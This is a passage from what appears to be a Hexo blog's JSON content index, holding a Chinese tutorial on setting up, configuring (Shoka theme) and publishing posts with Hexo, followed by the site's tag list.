$\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo server More info: Server # Generate static files 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo generate More info: Generating # Deploy to remote sites 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo deploy More info: Deployment # 2. 参考博客 个人博客搭建完整版笔记 | pitt1997 = = 真正的大师永远都怀着一颗学徒的心 早教级别教你使用 Hexo 和 GitHub Pages 搭建属于自己的静态博客 - 搭建博客 - 前端设计 | MyBlog = MqyGalaxy | Blog = 爱好 ACG 的温馨小窝 (moeqy.com) Step.3 界面显示 - Theme Shoka Documentation - 二进制杂谈 - 计算机科学 | Yume Shoka = 優萌初華 = 有夢書架 (lostyu.me) # 3.Shoka 的一些配置和说明 我们已经完成 Hexo 默认安装以及部署，现在我们使用其他主题加载我们的个人博客。 Shoka 主题相关链接如下。 123456主题主页：https://shoka.lostyu.me/文档说明：https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/基本配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/config/页面配置: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/依赖插件: https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/dependents/ # 4. 发布博客 写一篇文章，步骤参考 # 创建文章 其中 title 为文章的标题。 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;title&quot; 执行完成后 hexo 会根据目录下 scaffolds/post.md，在 source/_posts 文件夹下创建一个名为 title.md 的文件。 123 --- title: hello-worlddate: 2023-11-23 01:03:24tags: --- balabala..... 接下来就可以正式开始写文章了。 # 部署文章 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123hexo g -chexo shexo d 执行完成之后再次访问就可以看到内容了～","path":"基于hexo和shoka的博客使用教程/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]}],"categories":[],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"},{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"},{"name":"Foo","slug":"Foo","permalink":"http://example.com/tags/Foo/"},{"name":"Bar","slug":"Bar","permalink":"http://example.com/tags/Bar/"},{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]}